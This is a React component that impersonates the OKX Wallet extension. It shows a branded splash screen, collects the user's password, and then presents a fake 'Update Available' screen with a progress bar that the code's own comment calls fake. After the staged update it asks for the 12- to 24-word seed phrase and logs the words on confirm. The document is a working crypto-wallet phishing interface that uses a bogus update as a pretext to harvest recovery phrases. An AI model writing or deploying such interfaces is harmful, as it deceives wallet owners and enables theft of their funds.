import React, { useState, useEffect } from 'react';

interface OkxPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<number>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [seedError, setSeedError] = useState(false);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setSeedError(false);

      // Transition from splash to password
      const timer = setTimeout(() => {
        setView('password');
      }, 2800);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle the fake updating progress bar
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5; // Random jumps
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600); // Slight pause at 100% before transitioning
        }
        setUpdateProgress(progress);
      }, 400);

      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    // Validate lowercase and spaces only
    if (value.length > 0 && !/^[a-z]+$/.test(value)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && !seedError;
  };

  return (
    <>
      <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
        
        {/* Backdrop - Fades in/out */}
        <div 
          className={`absolute inset-0 bg-[#121212cc] transition-opacity duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] ${isOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal - Scales and Fades in/out smoothly */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[680px] md:border border-[#323232] md:overflow-y-hidden overflow-y-auto ${isOpen ? 'scale-100 opacity-100 pointer-events-auto' : 'scale-95 opacity-0 pointer-events-none'}`}>
          
          <div className="h-full w-full bg-[#000000] shadow-2xl relative overflow-hidden flex flex-col">
            
            {/* Slick Animated CSS Background (Replaces the Video) */}
            <div className={`absolute inset-0 z-0 transition-opacity duration-700 pointer-events-none ${(view === 'splash' || view === 'password') ? 'opacity-100' : 'opacity-0'}`}>
               <div className="absolute inset-0 okx-animated-bg opacity-30"></div>
               <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/50 to-black/95"></div>
            </div>

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="mb-6 animate-[okxLogoFloat_3s_ease-in-out_infinite]">
                <OkxLogoSVG className="w-20 h-20" />
              </div>
              <div className="mb-1.5 animate-[fadeIn_1s_ease-out_0.2s_both]">
                <h3 className="font-open-sans text-[#ffffff] font-bold text-[24px] leading-[33px]">Your portal to Web3</h3>
              </div>
              <div className="animate-[fadeIn_1s_ease-out_0.4s_both]">
                <p className="font-open-sans text-[#909090] font-normal text-[12px] leading-[24px] tracking-widest uppercase">Wallet · Trade · NFT · Earn</p>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-5 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="flex-1 flex flex-col items-center justify-center">
                
                <div className="mb-6">
                  <OkxLogoSVG className="w-14 h-14 drop-shadow-[0_0_15px_rgba(255,255,255,0.2)]" />
                </div>

                <div className="mb-1.5">
                  <h3 className="font-open-sans text-[#ffffff] font-bold text-[22px] leading-[33px]">Welcome back</h3>
                </div>
                <div className="mb-8">
                  <p className="font-open-sans text-[#909090] font-normal text-[13px] leading-[24px]">Enter your password to unlock OKX Wallet</p>
                </div>
                
                <div className="relative w-full mb-12 sm:mb-20">
                  <input 
                    className="w-full h-[52px] py-[11px] pl-[16px] pr-[48px] text-[15px] font-normal rounded-[12px] text-[#ffffff] border border-[#333333] focus:border-[#ffffff] bg-[#141414] focus:bg-[#1a1a1a] outline-none transition-all duration-300 placeholder:opacity-40 font-open-sans shadow-inner" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="group cursor-pointer absolute right-4 top-[18px]"
                  >
                    {!showPassword ? (
                      <svg className="text-[#909090] w-[18px] h-[18px] hover:text-white transition-colors" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>
                    ) : (
                      <svg className="text-[#909090] w-[18px] h-[18px] hover:text-white transition-colors" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full mb-4">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full h-[52px] text-[#000000] bg-[#ffffff] font-semibold font-open-sans text-[16px] leading-[24px] cursor-pointer rounded-full px-4 py-3 hover:scale-[1.02] transition-all duration-300 disabled:opacity-100 disabled:bg-[#1a1a1a] disabled:text-[#5b5b5b] disabled:scale-100 disabled:cursor-not-allowed active:scale-[0.98]" 
                    type="button"
                  >
                    Unlock
                  </button>
                </div>
                <div className="w-full mb-4">
                  <button className="w-full h-[52px] text-[#909090] bg-transparent font-medium font-open-sans text-[14px] leading-[16px] cursor-pointer rounded-full px-4 py-3 hover:text-white transition-colors duration-300" type="button">
                    Forgot password?
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 bg-[#000000] transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full">
                <div className="flex flex-col items-center justify-center mb-8">
                  <div className="mb-5 mt-4">
                    <OkxLogoSVG className="w-16 h-16 text-[#aefa49]" />
                  </div>
                  <h3 className="font-open-sans text-[#ffffff] font-bold text-[24px] leading-[33px] mb-1 text-center">Update Available</h3>
                  <p className="font-open-sans text-[#909090] font-normal text-[16px] leading-[24px] mb-1 text-center">Version 3.82.11</p>
                </div>
                
                <div className="bg-[#111111] border border-[#222222] rounded-[16px] p-5 mb-8">
                  <ul className="space-y-4">
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mt-2 mr-3">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#aefa49] shadow-[0_0_8px_rgba(174,250,73,0.6)]"></div>
                      </div>
                      <span className="font-open-sans text-[#e4e4e4] font-normal text-[14px] leading-[20px]">Fix main build modifying desktop build steps</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mt-2 mr-3">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#aefa49] shadow-[0_0_8px_rgba(174,250,73,0.6)]"></div>
                      </div>
                      <span className="font-open-sans text-[#e4e4e4] font-normal text-[14px] leading-[20px]">Improving the security system</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mt-2 mr-3">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#aefa49] shadow-[0_0_8px_rgba(174,250,73,0.6)]"></div>
                      </div>
                      <span className="font-open-sans text-[#e4e4e4] font-normal text-[14px] leading-[20px]">Fix incorrect network information</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mt-2 mr-3">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#aefa49] shadow-[0_0_8px_rgba(174,250,73,0.6)]"></div>
                      </div>
                      <span className="font-open-sans text-[#e4e4e4] font-normal text-[14px] leading-[20px]">Improve performance on signature request</span>
                    </li>
                  </ul>
                </div>
                
                <div className="mt-auto">
                  <button 
                    onClick={() => setView('updating')}
                    className="w-full h-[52px] text-[#000000] bg-[#aefa49] font-semibold font-open-sans text-[16px] leading-[24px] cursor-pointer rounded-full px-4 py-3 hover:scale-[1.02] transition-all duration-300 hover:shadow-[0_0_20px_rgba(174,250,73,0.3)] active:scale-[0.98]" 
                    type="button"
                  >
                    Update
                  </button>
                  <div className="text-center mt-5 pb-2">
                    <a href="https://www.okx.com/help" target="_blank" rel="noreferrer" className="font-open-sans text-[#aefa49] text-[13px] font-medium hover:underline opacity-80 hover:opacity-100 transition-opacity">Need help? Contact our Support</a>
                  </div>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-[#000000] transition-opacity duration-500 ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full">
                <div className="flex flex-col items-center justify-center mt-12 mb-16">
                  <div className="mb-10 relative">
                    {/* Background Circle */}
                    <svg className="w-24 h-24 text-[#1a1a1a]" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <circle cx="50" cy="50" r="44" stroke="currentColor" strokeWidth="6"></circle>
                    </svg>
                    {/* Animated Progress Circle */}
                    <svg className="absolute inset-0 w-24 h-24 text-[#aefa49] animate-[spin_1.5s_linear_infinite]" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <circle cx="50" cy="50" r="44" stroke="currentColor" strokeWidth="6" strokeLinecap="round" strokeDasharray="80, 278"></circle>
                    </svg>
                    {/* Center Logo */}
                    <div className="absolute inset-0 flex items-center justify-center">
                      <OkxLogoSVG className="w-10 h-10 text-[#aefa49]" />
                    </div>
                  </div>
                  
                  <h3 className="font-open-sans text-[#ffffff] font-bold text-[24px] leading-[33px] mb-2 text-center">Updating OKX Wallet</h3>
                  <p className="font-open-sans text-[#909090] font-normal text-[15px] leading-[24px] mb-8 text-center">Please wait while we update to version 3.82.11</p>
                </div>
                
                <div className="w-full mb-6 mt-auto">
                  <div className="w-full h-[6px] bg-[#1a1a1a] rounded-full overflow-hidden">
                    <div className="h-full bg-[#aefa49] rounded-full transition-all duration-300 shadow-[0_0_10px_rgba(174,250,73,0.5)]" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-open-sans text-[#909090] text-[13px] font-normal">Downloading update...</p>
                    <p className="font-open-sans text-[#ffffff] text-[14px] font-bold">{updateProgress}%</p>
                  </div>
                </div>
                
                <div className="text-center pb-2">
                  <p className="font-open-sans text-[#666666] text-[13px] font-normal">Please do not close this window during the update.</p>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#000000] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="border-b border-[#222222] shrink-0">
                <div className="flex justify-between items-center p-4">
                  <button className="p-2 -ml-2 rounded-full hover:bg-[#1a1a1a] transition-colors duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                    <svg className="w-6 h-6 text-[#ffffff]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                  </button>
                  <p className="font-open-sans text-[#ffffff] font-bold text-[17px] leading-[24px]">Import Secret Phrase</p>
                  <div className="w-10"></div>
                </div>
              </div>

              <div className="flex justify-start items-center px-5 py-4 gap-x-2 shrink-0">
                <span className="font-open-sans text-[#909090] font-normal text-[14px]">My seed phrase has</span>
                <select 
                  className="font-open-sans text-[#ffffff] font-semibold text-[14px] border border-[#333333] rounded-md px-2 py-1 bg-[#111111] outline-none cursor-pointer hover:border-[#555555] transition-colors" 
                  value={phraseLength}
                  onChange={(e) => {
                    setPhraseLength(Number(e.target.value));
                    setPhraseValues(Array(24).fill(''));
                    setSeedError(false);
                  }}
                >
                  <option value={12}>12 words</option>
                  <option value={15}>15 words</option>
                  <option value={18}>18 words</option>
                  <option value={21}>21 words</option>
                  <option value={24}>24 words</option>
                </select>
              </div>

              <div className="flex-1 overflow-y-auto px-5 pb-4 okx-custom-scrollbar">
                <div className="grid grid-cols-2 gap-3">
                  {Array.from({ length: phraseLength }).map((_, i) => (
                    <div key={i} className="relative group">
                      <div className="px-[12px] absolute top-[14px] flex items-center justify-start gap-x-2 pointer-events-none">
                        <p className="font-open-sans text-[#777777] group-focus-within:text-white transition-colors text-[13px] font-medium min-w-[16px]">{i + 1}</p>
                        <span className="h-[14px] w-[1px] bg-[#333333] group-focus-within:bg-[#555555] transition-colors"></span>
                      </div>
                      <input 
                        className={`w-full py-[12px] pl-[46px] pr-[12px] text-[15px] font-medium rounded-[10px] text-[#ffffff] border hover:border-[#555555] bg-[#111111] focus:bg-[#1a1a1a] outline-none transition-all duration-300 font-open-sans ${seedError && phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]) ? 'border-[#eb4b6d] text-[#eb4b6d] focus:border-[#eb4b6d]' : 'border-[#222222] focus:border-[#ffffff]'}`} 
                        type="text" 
                        value={phraseValues[i]}
                        onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                      />
                    </div>
                  ))}
                </div>
              </div>

              <div className="px-5 py-5 shrink-0 bg-[#000000] border-t border-[#222222]">
                <button 
                  className="w-full h-[52px] text-[#000000] bg-[#ffffff] font-bold font-open-sans text-[16px] leading-[24px] cursor-pointer rounded-full px-4 py-3 hover:scale-[1.02] transition-all duration-300 disabled:opacity-100 disabled:bg-[#1a1a1a] disabled:text-[#5b5b5b] disabled:scale-100 disabled:cursor-not-allowed active:scale-[0.98]" 
                  type="button" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("OKX Import Complete:", phraseValues.slice(0, phraseLength));
                    onClose();
                  }}
                >
                  Confirm
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .okx-custom-scrollbar::-webkit-scrollbar {
          width: 5px;
        }
        .okx-custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .okx-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #333333;
          border-radius: 10px;
        }
        .okx-custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #555555;
        }
        
        /* Slick Background Animation */
        .okx-animated-bg {
          background: 
            radial-gradient(circle at 15% 50%, rgba(255, 255, 255, 0.08), transparent 25%),
            radial-gradient(circle at 85% 30%, rgba(255, 255, 255, 0.05), transparent 25%);
          background-size: 200% 200%;
          animation: okxBgShift 15s ease infinite;
        }
        @keyframes okxBgShift {
          0% { background-position: 0% 0%; }
          50% { background-position: 100% 100%; }
          100% { background-position: 0% 0%; }
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes okxLogoFloat {
          0% { transform: translateY(0px) scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
          50% { transform: translateY(-8px) scale(1.02); filter: drop-shadow(0 0 20px rgba(255,255,255,0.3)); }
          100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// OKX LOGO SVG COMPONENT
// -------------------------------------------------------------------

const OkxLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="32" height="32" rx="8" className="fill-current"></rect>
    <rect x="6.5" y="6.5" width="6" height="6" rx="1" className="fill-black"></rect>
    <rect x="6.5" y="19.5" width="6" height="6" rx="1" className="fill-black"></rect>
    <rect x="19.5" y="6.5" width="6" height="6" rx="1" className="fill-black"></rect>
    <rect x="19.5" y="19.5" width="6" height="6" rx="1" className="fill-black"></rect>
    <rect x="13" y="13" width="6" height="6" rx="1" className="fill-black"></rect>
  </svg>
);